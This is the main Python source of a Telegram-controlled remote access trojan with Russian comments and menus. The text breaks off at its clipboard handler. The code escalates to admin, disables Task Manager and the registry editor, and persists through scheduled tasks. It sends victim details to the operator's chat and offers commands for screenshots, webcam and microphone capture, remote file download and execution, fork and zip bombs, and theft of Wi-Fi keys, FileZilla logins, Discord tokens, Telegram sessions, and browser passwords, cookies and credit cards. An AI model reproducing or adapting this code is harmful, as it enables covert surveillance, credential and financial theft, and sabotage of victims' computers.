###########################################
from config                        import *
###########################################
from func.Settings.Organization    import *
from func.Settings.Antivirus       import *
from func.Settings.Admin           import *
from func.Settings.CriticalProcess import *
from func.Settings.MessageBox      import *
###########################################
from func.Network.Information      import *
from func.Network.Location         import *
###########################################
from func.Main.Screen              import *
from func.Main.Webcam              import *
from func.Main.Audio               import *
from func.Main.Power               import *
from func.Main.Autorun             import *
###########################################
from func.Files.Tasklist           import *
from func.Files.Taskkill           import *
###########################################
from func.Fun.Message              import *
from func.Fun.Speak                import *
from func.Fun.OpenURL              import *
from func.Fun.Wallpapers           import *
###########################################
from func.Bomb.ZipBomb             import *
from func.Bomb.ForkBomb            import *
###########################################
from func.Stealer.Wifi             import *
from func.Stealer.FileZilla        import *
from func.Stealer.Discord          import *
from func.Stealer.Chromium         import *
from func.Stealer.Telegram         import *
###########################################
from func.Other.Clipboard          import *
from func.Other.Keylogger          import *
from func.Other.SendKeys           import *
from func.Other.Monitor            import *
from func.Other.Volume             import *
from func.Other.Rotate             import *
from func.Other.Freeze             import *
from func.Other.DVD                import *
###########################################
import telebot
############################################

bot = telebot.TeleBot(TelegramToken, threaded=True)
bot.worker_pool = util.ThreadPool(bot, num_threads=50)

menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = telebot.types.KeyboardButton('/1\n<<')
button2 = telebot.types.KeyboardButton('/2\n>>')
button3 = telebot.types.KeyboardButton('/Screen\n🖼')
button4 = telebot.types.KeyboardButton('/Webcam\n📸')
button5 = telebot.types.KeyboardButton('/Audio\n🎙')
button6 = telebot.types.KeyboardButton('/Power\n🔴')
button7 = telebot.types.KeyboardButton('/Autorun\n🔵')
menu.row(button1, button3, button2)
menu.row(button4, button5)
menu.row(button6, button7)

main2 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('Гибернация - 🛑', callback_data='hibernate')
button2 = telebot.types.InlineKeyboardButton('Завершение работы - ⛔️', callback_data='shutdown')
button3 = telebot.types.InlineKeyboardButton('Перезагрузка - ⭕️', callback_data='restart')
button4 = telebot.types.InlineKeyboardButton('Выйти - 💢', callback_data='logoff')
button5 = telebot.types.InlineKeyboardButton('BSOD - 🌀', callback_data='bsod')
button6 = telebot.types.InlineKeyboardButton('« Назад', callback_data='cancel')
main2.row(button1)
main2.row(button2)
main2.row(button3)
main2.row(button4)
main2.row(button5)
main2.row(button6)

main3 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('Добавить в автозагрузку - 📥', callback_data='startup')
button2 = telebot.types.InlineKeyboardButton('Удалить - ♻️', callback_data='confirm')
button3 = telebot.types.InlineKeyboardButton('« Назад', callback_data='cancel')
main3.row(button1)
main3.row(button2)
main3.row(button3)

main4 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('Подтвердить!', callback_data='uninstall')
button2 = telebot.types.InlineKeyboardButton('Отмена!', callback_data='cancel')
button3 = telebot.types.InlineKeyboardButton('« Назад', callback_data='cancel')
main4.row(button1)
main4.row(button2)
main4.row(button3)

main5 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = telebot.types.KeyboardButton('/3\n<<')
button2 = telebot.types.KeyboardButton('/4\n>>')
button3 = telebot.types.KeyboardButton('/Screen\n🖼')
button4 = telebot.types.KeyboardButton('/Files\n💾')
button5 = telebot.types.KeyboardButton('/Tasklist\n📋')
button6 = telebot.types.KeyboardButton('/Taskkill\n📝')
main5.row(button1, button3, button2)
main5.row(button4)
main5.row(button5, button6)

main6 = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('Завершить все процессы', callback_data='taskkill all')
button2 = telebot.types.InlineKeyboardButton('Отключить диспетчер задач', callback_data='disabletaskmgr')
main6.row(button1)
main6.row(button2)

main7 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = telebot.types.KeyboardButton('/CD\n🗂')
button2 = telebot.types.KeyboardButton('/Upload\n📡')
button3 = telebot.types.KeyboardButton('/ls\n📄')
button4 = telebot.types.KeyboardButton('/Remove\n🗑')
button5 = telebot.types.KeyboardButton('/Download\n📨')
button6 = telebot.types.KeyboardButton('/Run\n📌')
button7 = telebot.types.KeyboardButton('/Cancel')
main7.row(button1, button2, button3)
main7.row(button4, button5, button6)
main7.row(button7)

main8 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
button1 = telebot.types.KeyboardButton('/5\n<<')
button2 = telebot.types.KeyboardButton('/6\n>>')
button3 = telebot.types.KeyboardButton('/Screen\n🖼')
button4 = telebot.types.KeyboardButton('/Message\n💬')
button5 = telebot.types.KeyboardButton('/Speak\n📢')
button6 = telebot.types.KeyboardButton('/OpenURL\n🌐')
button7 = telebot.types.KeyboardButton('/Wallpapers\n🧩')
main8.row(button1, button3, button2)
main8.row(button4, button5)
main8.row(button6, button7)


# Обработчик команды / help

@bot.message_handler(commands=['Help', 'help'])
def Help(command):
	bot.send_message(command.chat.id,
		'ᅠᅠᅠᅠ ⚙️ *Команды* ⚙️'
		'\n'
		'\n*/Info* - _Информация о ПК_'
		'\n*/Location* - _Получение данных о местоположении_'
		'\n'
		'\n*/Screen* -  _Скриншот рабочего стола_'
		'\n*/Webcam* - _Скриншот веб-камеры_'
		'\n*/Audio* - _Запись микрофона_'
		'\n*/Power* - _Выключение компьютера_'
		'\n*/Autorun* - _Автозагрузка_'
		'\n'
		'\n*/Files* - _Файл менеджер_'
		'\n› */CD* - _Изменить директорию_'
		'\n› */ls* - _Список файлов_'
		'\n› */Remove* - _Удалить файл_'
		'\n› */Upload* - _Отправить файл_'
		'\n› */Download* - _Скачать файл_'
		'\n› */Run* - _Запустить файл_'
		'\n*/Tasklist* - _Список процессов_'
		'\n*/Taskkill* - _Завершить процесс_'
		'\n'
		'\n*/Message* - _Отправить сообщение_'
		'\n*/Speak* - _Озвучить сообщение_'
		'\n*/OpenURL* - _Открыть ссылку_'
		'\n*/Wallpapers* - _Заменить обои_'
		'\n'
		'\n*/WiFi* - _Wi-Fi данные_'
		'\n*/FileZilla* - _FTP клиент_'
		'\n*/Discord* - _Discord токен_'
		'\n*/Telegram* - _Telegram сессия_'
		'\n*/CreditCards* - _Получить кредитные карты_'
		'\n*/Bookmarks* - _Получить закладки_'
		'\n*/Passwords* - _Получить пароли_'
		'\n*/Cookies* - _Получить куки_'
		'\n*/History* - _Получить историю_'
		'\n'
		'\n*/ZipBomb* - _Перегрузка памяти_'
		'\n*/ForkBomb* - _Запуск программ_'
		'\n'
		'\n*/Clipboard* - _Редактирование буфера обмена_'
		'\n*/Keylogger* - _Получить кейлог_'
		'\n*/SendKeys* - _Ввести клавиши_'
		'\n*/Monitor* - _Выключить\включить монитор_'
		'\n*/Volume* - _Изменить громкость_'
		'\n*/Rotate* - _Перевернуть монитор_'
		'\n*/Freeze* - _Заблокировать ввод_'
		'\n*/DVD* - _Управление дисководом_'
		'\n'
		'\n*/CMD* - _Выполнить команду в CMD_'
		'\n*/BAT* - _Пакетный сценарий_'
		'\n'
		'\n'
		'\n*by Prince | t.me/prince_soft 🔥*', 
			reply_markup=menu, parse_mode='Markdown')

# Создание папки для сохранения временных файлов

CurrentName = os.path.basename(sys.argv[0])
CurrentPath = sys.argv[0]

RAT = [
	Directory,
	Directory + 'Documents',
	Directory + 'Photos'
	]

for Directories in RAT:

	if not os.path.exists(Directories):
		os.makedirs(Directories)


# Запуск с правами админа

if AdminRightsRequired is True:

	if Admin() is False:
		while True:
			try:
				print('[~] › Попытка повысить привилегии до уровня администратора\n')
				os.startfile(CurrentPath, 'runas')
			except:
				pass
			else:
				print('[+] › ' + CurrentName + ' opened as admin rights\n')
				sys.exit()


# Отключение диспетчера задач

if DisableTaskManager is True:

	if os.path.exists(Directory + 'RegeditDisableTaskManager'):
		print('[+] › taskmgr.exe уже отключен\n')

	else:
		if Admin() is False:
			print('[-] › Для выполнения этой функции требуются права администратора\n')

		if Admin() is True:
			RegeditDisableTaskManager()
			open(Directory + 'RegeditDisableTaskManager', 'a').close()
			print('[+] › taskmgr.exe был отключен\n')


# Отключение редактора реестра

if DisableRegistryTools is True:

	if os.path.exists(Directory + 'RegeditDisableRegistryTools'):
		print('[+] › regedit.exe уже отключен\n')

	else:
		if Admin() is False:
			print('[-] › Для выполнения этой функции требуются права администратора\n')

		if Admin() is True:
			RegeditDisableRegistryTools()
			open(Directory + 'RegeditDisableRegistryTools', 'a').close()
			print('[+] › regedit.exe был отключен\n')


# Добавляет программы на автозагрузку

if AutorunEnabled is True:

	if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
		print('[+] › ' + CurrentName + ' ‹ уже запущен в автозагрузку › ' + InstallPath + ProcessName + '\n')

	else:
		if Admin() is False:
			print('[-] › Для выполнения этой функции требуются права администратора\n')

		if Admin() is True:
			AddToAutorun(AutorunName, InstallPath, ProcessName)

			if not os.path.exists(InstallPath + ProcessName):
				try:
					CopyToAutorun(CurrentPath, InstallPath, ProcessName)
				except:
					pass

			print('[+] › ' + CurrentName + ' ‹ был добавлен в автозагрузку › ' + InstallPath + ProcessName + '\n')


# Отображение сообщение на экране

if DisplayMessageBox is True:

	if not os.path.exists(Directory + 'DisplayMessageBox'):
		open(Directory + 'DisplayMessageBox', 'a').close()
		MessageBox(Message)


# Защита процесса рата с помощью BSOD (если его закрыли)

if ProcessBSODProtectionEnabled is True:

	if Admin() is False:
		print('[-] › Для выполнения этой функции требуются права администратора\n')

	if Admin() is True:
		if platform.release() == '10':
			Thread(target=ProcessChecker).start()

		if platform.release() != '10':
			SetProtection()

		print('[+] › Активирована защита процесса\n')


# Отправка сообщения о запуске рата

while True:
	try:

		if Admin() is True:
			Online = '👑 Скрипт запущен с правами администратора!'

		if Admin() is False:
			Online = '💻 Скприт запущен без прав администратора!'

		bot.send_message(TelegramChatID, 
			'\n*' + Online + '\n'
			'\nPC » ' + os.getlogin() +
			'\nOS » ' + Windows() +
			'\n'
			'\nAV » ' + Antivirus[0] +
			'\n'
			'\nIP » ' + Geolocation('query') + '*',
				parse_mode='Markdown')
		bot.send_message(TelegramChatID, 
		 	'Для получения справки введите /help')


	except Exception as e:
		print('[-] › Повторное подключение к api.telegram.org\n')
		print(e)

	else:
		print('[+] › Подключено к api.telegram.org\n')
		break


# Создание скриншота

@bot.message_handler(regexp='/Screen')
def Screen(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Screenshot.jpg'

		Screenshot(File)
		Screen = open(File, 'rb')

		bot.send_photo(command.chat.id, Screen)

	except:
		pass


# Создание скриншота вебки

@bot.message_handler(regexp='/Webcam')
def Webcam(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_photo')
		File = Directory + 'Webcam.jpg'

		if os.path.exists(File):
			os.remove(File)

		WebcamScreenshot(File)
		Webcam = open(File, 'rb')

		bot.send_photo(command.chat.id, Webcam)

	except:
		bot.reply_to(command, '_Веб-камера не найдена._', parse_mode='Markdown')


# Записывает звук с микрофона

@bot.message_handler(regexp='/Audio')
def Audio(command):
	try:

		Seconds = re.split('/Audio ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_Запись..._', parse_mode='Markdown')
		try:

			File = Directory + 'Audio.wav'

			Microphone(File, Seconds)
			Audio = open(File, 'rb')

			bot.send_voice(command.chat.id, Audio)

		except ValueError:
			bot.reply_to(command, '_Выберите продолжительность записи в секундах (число)_', parse_mode='Markdown')

		except:
			bot.reply_to(command, '_Microphone not found._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Выберите продолжительность записи (в секундах)_\n\n*› /Audio*', parse_mode='Markdown')


# Отправка сообщения

def SendMessage(call, text):
	try:
		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=text, parse_mode='Markdown')
	except:
		pass


# Управление питанием

@bot.callback_query_handler(func=lambda call: True)
def CallbackInline(command):
	if command.message:


		# Гибернация

		if command.data == 'hibernate':
			SendMessage(command, '_Получена команда перехода в спящий режим!_')
			UnsetProtection()
			Hibernate()


		# Завершение работы

		if command.data == 'shutdown':
			SendMessage(command, '*Завершение работы*!')
			UnsetProtection()
			Shutdown()


		# Перезапуск

		if command.data == 'restart':
			SendMessage(command, '*Перезапуск*!')
			UnsetProtection()
			Restart()


		# Выход из системы

		if command.data == 'logoff':
			SendMessage(command, '*Выход из системы*!')
			UnsetProtection()
			Logoff()


		# Активация синего экрана смерти

		if command.data == 'bsod':
			SendMessage(command, 'Активирован "Синий экран смерти"!')
			UnsetProtection()
			BSoD()


		# Обработка кнопки, которая добавляет троянца в автозагрузку (schtasks)

		if command.data == 'startup':

			if SchtasksExists(AutorunName) and InstallPathExists(InstallPath, ProcessName) is True:
				SendMessage(command, '*' + ProcessName + '* is already in startup.')

			else:

				if Admin() is False:
					SendMessage(command, '_This function requires admin rights._')

				if Admin() is True:
					AddToAutorun(AutorunName, InstallPath, ProcessName)

					if not os.path.exists(InstallPath + ProcessName):
						try:
							CopyToAutorun(CurrentPath, InstallPath, ProcessName)
						except:
							pass

					SendMessage(command, '*' + ProcessName + '* has been copied to startup!')


		# Обработка кнопки, подтверждающей удаление вируса

		if command.data == 'confirm':
			bot.edit_message_text(chat_id=command.message.chat.id,
				message_id=command.message.message_id, text='_Are you sure?_', reply_markup=main4, parse_mode='Markdown')


		# Работа с кнопкой <<Удалить>>

		if command.data == 'uninstall':
			SendMessage(command, '*' + CurrentName + '* has been uninstalled!')
			Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Directory)


		# Обработка кнопки <<Завершить все процессы>>

		if command.data == 'taskkill all':
			SendMessage(command, '_Terminating processes..._')
			TaskkillAll(CurrentName)
			SendMessage(command, '_All processes has been terminated!_')


		# Работа с кнопкой <<Отключить диспетчер задач>>

		if command.data == 'disabletaskmgr':

			if os.path.exists(Directory + 'RegeditDisableTaskManager'):
				SendMessage(command, '*taskmgr.exe* is already disabled.')

			else:

				if Admin() is False:
					SendMessage(command, '_This function requires admin rights._')

				if Admin() is True:
					RegeditDisableTaskManager()
					open(Directory + 'RegeditDisableTaskManager', 'a').close()
					SendMessage(command, '*taskmgr.exe* has been disabled!')


		# Управление кнопкой <<Назад>>

		if command.data == 'cancel':
			SendMessage(command, '`...`')


# Просматривайте каталоги и переключайтесь между ними

@bot.message_handler(regexp='/CD')
def CD(command):
	try:

		Path = re.split('/CD ', command.text, flags=re.I)[1]
		os.chdir(Path)
		bot.send_message(command.chat.id, '_Директория изменена!_\n\n`' + os.getcwd() + '`', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_Директория не найдена._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Текущая директория_\n\n`' + os.getcwd() + '`\n\n_Имя пользователя_\n\n`' + os.getlogin() + '`', parse_mode='Markdown')


# Список файлов из каталога

@bot.message_handler(regexp='/ls')
def ls(command):
	try:

		Dirs = '\n``'.join(os.listdir())
		bot.send_message(command.chat.id, '`' + os.getcwd() + '`\n\n' + '`' + Dirs + '`', parse_mode='Markdown')

	except:
		try:

			Dirse = '\n'.join(os.listdir())
			SplittedText = telebot.util.split_string(Dirse, 4096)
			for Dirse in SplittedText:
				bot.send_message(command.chat.id, '`' + Dirse + '`', parse_mode='Markdown')

		except PermissionError:
				bot.reply_to(command, '_Нет доступа._', parse_mode='Markdown')


# Удаляет выбранный пользователем файл

@bot.message_handler(commands=['Remove', 'remove'])
def Remove(command):
	try:

		File = re.split('/Remove ', command.text, flags=re.I)[1]
		Created = os.path.getctime(os.getcwd() + '\\' + File)
		Year, Month, Day, Hour, Minute, Second=time.localtime(Created)[:-3]

		def ConvertBytes(num):
			for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
				if num < 1024.0:
					return '%3.1f %s' % (num, x)
				num /= 1024.0

		def FileSize(FilePath):
			if os.path.isfile(FilePath):
				FileInfo = os.stat(FilePath)
				return ConvertBytes(FileInfo.st_size)

		bot.send_message(command.chat.id, 
			'File *' + File + '* удален!' 
			'\n' 
			'\n*Created* » `%02d/%02d/%d'%(Day, Month, Year) + '`' +
			'\n*Size* » `' + FileSize(os.getcwd() + '\\' + File) + '`',
				parse_mode='Markdown')

		os.remove(os.getcwd() + '\\' + File)

	except:
		try:

			File = re.split('/Remove ', command.text, flags=re.I)[1]
			Created = os.path.getctime(os.getcwd() + '\\' + File)
			Year, Month, Day, Hour, Minute, Second=time.localtime(Created)[:-3]
			Folder = os.getcwd() + '\\' + File
			FolderSize = 0

			for (Path, Dirs, Files) in os.walk(Folder):
				for iFile in Files:
					FileName = os.path.join(Path, iFile)
					FolderSize += os.path.getsize(FileName)
			Files = Folders = 0

			for _, DirNames, FileNames in os.walk(os.getcwd() + '\\' + File):
				Files += len(FileNames)
				Folders += len(DirNames)

			shutil.rmtree(os.getcwd() + '\\' + File)

			bot.send_message(command.chat.id, 
				'Folder *' + File + '* удален!'
				'\n'
				'\n*Created* » `%02d/%02d/%d'%(Day, Month, Year) + '`' +
				'\n*Size* » `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
				'\n*Contained* » `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
					parse_mode='Markdown')

		except FileNotFoundError:
			bot.reply_to(command, '_Файл не найден._', parse_mode='Markdown')

		except PermissionError:
			bot.reply_to(command, '_Отказано в доступе._', parse_mode='Markdown')

		except:
			bot.send_message(command.chat.id, '_Введите имя файла_\n\n*› /Remove • /RemoveAll*', parse_mode='Markdown')


# Удаляет все файлы из каталога

@bot.message_handler(commands=['RemoveAll', 'removeall'])
def RemoveAll(command):
	try:

		bot.send_message(command.chat.id, '_Удаление файлов..._', parse_mode='Markdown')

		FolderSize = 0
		for (Path, Dirs, Files) in os.walk(os.getcwd()):
			for File in Files:
				FileNames = os.path.join(Path, File)
				FolderSize += os.path.getsize(FileNames)
		Files = Folders = 0

		for _, DirNames, FileNames in os.walk(os.getcwd()):
			Files += len(FileNames)
			Folders += len(DirNames)
		list = os.listdir(os.getcwd())
		a = len(list)

		for FileNames in os.listdir(os.getcwd()):
			FilePath = os.path.join(os.getcwd(), FileNames)
			try:
				if os.path.isfile(FilePath) or os.path.islink(FilePath):
					os.unlink(FilePath)
				elif os.path.isdir(FilePath):
					shutil.rmtree(FilePath)
			except:
				pass

		list = os.listdir(os.getcwd())
		b = len(list)
		c = (a - b)

		bot.reply_to(command,
			'Removed *' + str(c) + '* files out of *' + str(a) + '!*'
			'\n'
			'\nSize » `%0.1f MB' % (FolderSize/(1024*1024.0)) + '`' +
			'\nContained » `' + '{:,} Files, {:,} Folders'.format(Files, Folders) + '`',
				parse_mode='Markdown')

	except:
		pass


# Загрузить файл на подключенный компьютер (URL)

@bot.message_handler(regexp='/Upload')
def Upload(command):
	try:

		URL = re.split('/Upload ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_Загрузка файла..._', parse_mode='Markdown')

		Filename = os.getcwd() + '\\' + os.path.basename(URL)
		r = urllib.request.urlretrieve(URL, Filename)

		bot.reply_to(command, '_Файл загружен на компьютер!_\n\n`' + Filename + '`', parse_mode='Markdown')

	except ValueError:
		bot.reply_to(command, '_Вставьте прямую ссылку на скачивание._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Отправить файл или вставить URL-адрес_\n\n*› /Upload*', parse_mode='Markdown')


# Загрузить файл на подключенный компьютер (сообщение)

@bot.message_handler(content_types=['document'])
def Document(command):
	try:

		File = bot.get_file(command.document.file_id)
		bot.send_message(command.chat.id, '_Загрузка файла..._', parse_mode='Markdown')
		DownloadedFile = bot.download_file(File.file_path)
		Source = Directory + File.file_path;
		with open(Source, 'wb') as NewFile:
			NewFile.write(DownloadedFile)

		Final = os.getcwd() + '\\' + Source.split(File.file_path)[1] + command.document.file_name
		shutil.move(Source, Final)
		bot.reply_to(command, '_Файл, загруженный на компьютер!_\n\n`' + Final + '`', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_Формат файла не поддерживается._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_Попробуйте сохранить файл в другом каталоге._', parse_mode='Markdown')

	except:
		bot.reply_to(command, '_Вы не можете загрузить файл размером более 20 МБ._', parse_mode='Markdown')


# Загружает файл, выбранный юзером

@bot.message_handler(regexp='/Download')
def Download(command):
	try:

		File = re.split('/Download ', command.text, flags=re.I)[1]
		Download = open(os.getcwd() + '\\' + File, 'rb')
		bot.send_message(command.chat.id, '_Отправка файла..._', parse_mode='Markdown')
		bot.send_document(command.chat.id, Download)

	except FileNotFoundError:
		bot.reply_to(command, '_Файл не найден._', parse_mode='Markdown')

	except:
		try:

			File = re.split('/Download ', command.text, flags=re.I)[1]
			bot.send_message(command.chat.id, '_Архивация..._', parse_mode='Markdown')
			shutil.make_archive(Directory + File,
								'zip',
								os.getcwd() + '\\',
								File)
			iFile = open(Directory + File + '.zip', 'rb')
			bot.send_message(command.chat.id, '_Отправка папки..._', parse_mode='Markdown')
			bot.send_document(command.chat.id, iFile)
			iFile.close()
			os.remove(Directory + File + '.zip')

		except PermissionError:
			bot.reply_to(command, '_Отказано в доступе._', parse_mode='Markdown')

		except:
			try:

				iFile.close()
				os.remove(Directory + File + '.zip')
				bot.reply_to(command, '_Вы не можете загрузить файл размером более 50 МБ._', parse_mode='Markdown')

			except:
				bot.send_message(command.chat.id, '_Введите имя файла_\n\n*› /Download*', parse_mode='Markdown')


# Запускает файл, выбранный юзером

@bot.message_handler(commands=['Run', 'run'])
def Run(command):
	try:

		File = re.split('/Run ', command.text, flags=re.I)[1]
		os.startfile(os.getcwd() + '\\' + File)
		bot.reply_to(command, 'File *' + File + '* has been running!', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_Файл не найден._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_Файл изолирован системой и не может быть запущен._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Введите имя файла_\n\n*› /Run • /RunAS*', parse_mode='Markdown')


# Запускает файл, выбранный пользователем в качестве администратора

@bot.message_handler(commands=['RunAS', 'runas'])
def RunAS(command):
	try:

		File = re.split('/RunAS ', command.text, flags=re.I)[1]
		os.startfile(os.getcwd() + '\\' + File, 'runas')
		bot.reply_to(command, 'File *' + File + '* has been running!', parse_mode='Markdown')

	except FileNotFoundError:
		bot.reply_to(command, '_Файл не найден._', parse_mode='Markdown')

	except OSError:
		bot.reply_to(command, '_Отказано в доступе._', parse_mode='Markdown')
	except:
		bot.send_message(command.chat.id, '_Введите имя файла_\n\n*› /Run • /RunAS*', parse_mode='Markdown')


# Получение список активных процессов

@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
	bot.send_message(command.chat.id, '`' + ProcessList() + '`', parse_mode='Markdown')


# Завершает выбранный юзером процесс

@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
	try:

		Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
		KillProcess(Process)

		if not Process.endswith('.exe'):
			Process = Process + '.exe'

		bot.reply_to(command, 'Процесс *' + Process + '* был остановлен!', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, 
			'_Введите имя процесса_'
			'\n'
			'\n*› /Taskkill*'
			'\n'
			'\n_Активное окно_'
			'\n'
			'\n`' + WindowTitle() + '`',
				reply_markup=main6, parse_mode='Markdown')


# Отображает текст, отправленный пользователем

@bot.message_handler(regexp='/Message')
def Message(command):
	try:

		Message = re.split('/Message ', command.text, flags=re.I)[1]
		bot.reply_to(command, '_Сообщение было отправлено!_', parse_mode='Markdown')
		SendMessageBox(Message)

	except:
		bot.send_message(command.chat.id, '_Введите ваше сообщение_\n\n*› /Message*', parse_mode='Markdown')


# Озвучивает текст

@bot.message_handler(regexp='/Speak')
def Speak(command):
	try:

		Text = re.split('/Speak ', command.text, flags=re.I)[1]
		bot.send_message(command.chat.id, '_Озвучивает..._', parse_mode='Markdown')
		try:

			SpeakText(Text)
			bot.reply_to(command, '_Успешно!_', parse_mode='Markdown')

		except:
			bot.reply_to(command, '_Ошибка в озвучке текста._', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Введите ваш текст после команды /Speak_\n\n*› /Speak*', parse_mode='Markdown')


# Открывает ссылку в стандартном браузере

@bot.message_handler(regexp='/OpenURL')
def OpenURL(command):
	try:

		URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
		OpenBrowser(URL)
		bot.reply_to(command, '_URL-адрес был открыт!_', parse_mode='Markdown')

	except:
		bot.send_message(command.chat.id, '_Введите свой URL-адрес_\n\n*› /OpenURL*', parse_mode='Markdown')


# Устанавливает обои для рабочего стола

@bot.message_handler(content_types=['photo'])
def Wallpapers(command):

	Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
	File = bot.get_file(command.photo[len(command.photo)-1].file_id)
	DownloadedFile = bot.download_file(File.file_path)
	Source = Directory + File.file_path;
	with open(Source, 'wb') as new_file:
		new_file.write(DownloadedFile)

	SetWallpapers(Photo, Directory)
	bot.reply_to(command, '_Фотография была установлена на обои для рабочего стола!_', parse_mode='Markdown')


# Бесконечный старт CMD.exe

@bot.message_handler(regexp='/ForkBomb')
def ForkBomb(command):

	bot.send_message(command.chat.id, '_Подготовка к CMD-бомберу..._', parse_mode='Markdown')
	Forkbomb()


# Бесконечное создание файлов

@bot.message_handler(regexp='/ZipBomb')
def ZipBomb(command):

	bot.send_message(command.chat.id, '_Подготовка Zip-бомберу..._', parse_mode='Markdown')
	Zipbomb()


# Получает пароль Wi-Fi

@bot.message_handler(regexp='/WiFi')
def WiFi(command):
	try:

		bot.send_message(command.chat.id, 
			'_Полученные данные Wi-Fi_'
			'\n'
			'\n*SSID* » `' + StealWifiPasswords()['SSID'] + '`' +
			'\n*AUTH* » `' + StealWifiPasswords()['AUTH'] + '`' +
			'\n*Cipher* » `' + StealWifiPasswords()['Cipher'] + '`' + 
			'\n*Security Key* » `' + StealWifiPasswords()['SecurityKey'] + '`' +
			'\n*Password* » `' + StealWifiPasswords()['Password'] + '`',
				parse_mode='Markdown')

	except:
		bot.reply_to(command, '_Не удалось выполнить аутентификацию Wi-Fi._', parse_mode='Markdown')


# Получает пароль FileZilla

@bot.message_handler(regexp='/FileZilla')
def FileZilla(command):
	try:

		bot.send_message(command.chat.id,
			'_Полученные данные FileZilla_'
			'\n'
			'\n*Hostname* » `' + StealFileZilla()['Hostname'] + '`' +
			'\n*Username* » `' + StealFileZilla()['Username'] + '`' +
			'\n*Password* » `' + StealFileZilla()['Password'] + '`',
				parse_mode='Markdown')

	except:
		bot.reply_to(command, '_FileZilla не установлена._', parse_mode='Markdown')


# Получает токен Discord

@bot.message_handler(regexp='/Discord')
def Discord(command):
	try:

		bot.send_message(command.chat.id, '*Discord токен*\n\n`' + DiscordToken() + '`', parse_mode='Markdown')

	except:
		bot.reply_to(command, '_Discord не установлен._', parse_mode='Markdown')


# Получает текущую сессию telegram пользователя

@bot.message_handler(regexp='/Telegram')
def Telegram(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		TelegramSession(Directory)
		Telegram = open(Directory + 'tdata.zip', 'rb')

		bot.send_document(command.chat.id, Telegram)

	except:
		bot.reply_to(command, '_Telegram не установлен._', parse_mode='Markdown')


# Извлекает сохраненные кредитки из браузеров (Opera, Chrome)

@bot.message_handler(regexp='/CreditCards')
def CreditCards(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'CreditCards.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedCreditCards())

		CreditCards = open(Directory + 'CreditCards.txt', 'rb')
		bot.send_document(command.chat.id, CreditCards)

	except:
		bot.reply_to(command, '_Кредитки не были найдены._', parse_mode='Markdown')


# Извлекает сохраненные закладки из браузеров (Opera, Chrome)

@bot.message_handler(regexp='/Bookmarks')
def Bookmarks(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Bookmarks.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedBookmarks())

		Bookmarks = open(Directory + 'Bookmarks.txt', 'rb')
		bot.send_document(command.chat.id, Bookmarks)

	except:
		bot.reply_to(command, '_Закладки не найдены._', parse_mode='Markdown')


# Извлекает сохраненные пароли из браузеров (Opera, Chrome)

@bot.message_handler(regexp='/Passwords')
def Passwords(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Passwords.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedPasswords())

		Passwords = open(Directory + 'Passwords.txt', 'rb')
		bot.send_document(command.chat.id, Passwords)

	except:
		bot.reply_to(command, '_Пароли не были найдены._', parse_mode='Markdown')


# Извлекает сохраненные файлы cookie из браузеров (Opera, Chrome)

@bot.message_handler(regexp='/Cookies')
def Cookies(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'Cookies.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedCookies())

		Cookies = open(Directory + 'Cookies.txt', 'rb')
		bot.send_document(command.chat.id, Cookies)

	except:
		bot.reply_to(command, '_Куки не найдены._', parse_mode='Markdown')


# Получает сохраненную историю браузера (Opera, Chrome)

@bot.message_handler(regexp='/History')
def History(command):
	try:

		bot.send_chat_action(command.chat.id, 'upload_document')

		with open(Directory + 'History.txt', 'w', encoding='utf-8') as f:
			f.writelines(GetFormattedHistory())

		History = open(Directory + 'History.txt', 'rb')
		bot.send_document(command.chat.id, History)

	except:
		bot.reply_to(command, '_История не найдена._', parse_mode='Markdown')


# Редактирование и просмотр буфера обмена

@bot.message_handler(regexp='/Clipboard')
def Clipboard(command):
	try:

		Text = re.split('/Clipboard ', command.text, flags=re.I)[1]
		SetClipboard(Text)
